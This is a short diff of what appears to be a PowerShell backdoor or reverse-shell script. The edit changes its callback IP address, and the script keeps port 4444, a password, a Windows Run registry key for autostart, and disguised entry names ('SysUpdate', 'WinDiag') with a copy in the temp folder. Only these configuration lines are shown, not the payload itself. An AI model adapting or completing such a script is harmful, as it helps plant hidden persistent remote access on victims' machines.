@@ -1,4 +1,4 @@
-$ip = '192.168.1.15'; $port = 4444; $pass = "biskviti" 
+$ip = '192.168.12.99'; $port = 4444; $pass = "biskviti" 
 $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 $regNames = @("SysUpdate", "WinDiag") 
 $scriptPath = "$env:TEMP\sysupd.ps1"
